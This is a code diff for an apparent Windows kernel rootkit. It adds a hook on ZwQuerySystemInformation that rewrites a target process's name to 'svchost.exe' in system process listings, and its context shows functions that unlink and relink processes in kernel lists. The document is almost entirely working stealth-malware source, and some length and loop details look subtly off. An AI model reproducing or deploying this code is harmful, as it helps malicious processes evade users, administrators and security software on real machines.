@@ -1,7 +1,67 @@
 #include "process.h"
 
 
+//-----------------------------------------------
+
+ZW_QUERY_SYSTEM_INFORMATION glRealNtQuerySystemInformation;
+
+//-----------------------------------------------
+
+//-----------------------------------------------
+
 //----------------------------------------
+
+NTSTATUS HookZwQuerySystemInformation(
+	IN SYSTEM_INFORMATION_CLASS SystemInformationClass, 
+	OUT PVOID SystemInformation, 
+	IN ULONG SystemInformationLength, 
+	OUT PULONG ReturnLength
+) {
+	
+	NTSTATUS retStatus = STATUS_SUCCESS;
+	SYSTEM_PROCESS* currentProcInfo;
+	WCHAR targetName[] = { TARGET_NAME };
+	BOOLEAN isFirstProc = TRUE;
+	PWCHAR newNameAddr = NULL;
+
+	++glHookCount;
+	retStatus = glRealNtQuerySystemInformation(SystemInformationClass,
+		SystemInformation,
+		SystemInformationLength,
+		ReturnLength);
+
+#define NEW_NAME L"svchost.exe"
+
+	if (NT_SUCCESS(retStatus)) {
+		if (SystemInformationClass == SystemProcessInformation) {
+			if (ReturnLength) {
+				if ((SystemInformationLength - *ReturnLength) >= (sizeof(NEW_NAME) + 5)) {
+					currentProcInfo = (SYSTEM_PROCESS*)SystemInformation;
+					while (currentProcInfo->NextEntryDelta) {
+						if (currentProcInfo->ProcessName.Length) {							
+							if (!wcscmp(currentProcInfo->ProcessName.Buffer, (const wchar_t*)targetName)) {
+								if (isFirstProc) {
+									newNameAddr = (PWCHAR)((PCHAR)SystemInformation + *ReturnLength + 5);
+									RtlCopyMemory(newNameAddr, NEW_NAME, sizeof(NEW_NAME));
+								}
+								currentProcInfo->ProcessName.Buffer = newNameAddr;
+								currentProcInfo->ProcessName.Length = sizeof(NEW_NAME) - 1;
+								currentProcInfo->ProcessName.MaximumLength = sizeof(NEW_NAME);
+
+								isFirstProc = FALSE;
+							}
+						}
+						currentProcInfo = (SYSTEM_PROCESS*)((PUCHAR)currentProcInfo + currentProcInfo->NextEntryDelta);
+					}
+				}
+			}
+		}
+	}
+
+	--glHookCount;
+
+	return retStatus;
+}
 
 void DeleteFromProcessListByName(PCHAR TargetImageName){
 	PLIST_ENTRY currentEntry;
@@ -75,7 +135,7 @@ void InsertProcessEntry(){
 	
 	//DbgBreakPoint();
 	currentEntry = PsActiveProcessHead;
-	if(!strcmp(TARGET_NAME, "System")) {
+	if(!wcscmp(TARGET_NAME, L"System")) {
 		if(glTargetHandleTable){
 			InsertEntryInList(PsActiveProcessHead, GET_ENTRY_PROCESS_LIST(glTargetProcess));
 			InsertEntryInList(PsActiveHandleTableHead, GET_HANDLE_TABLE_LIST_ENTRY(glTargetHandleTable));
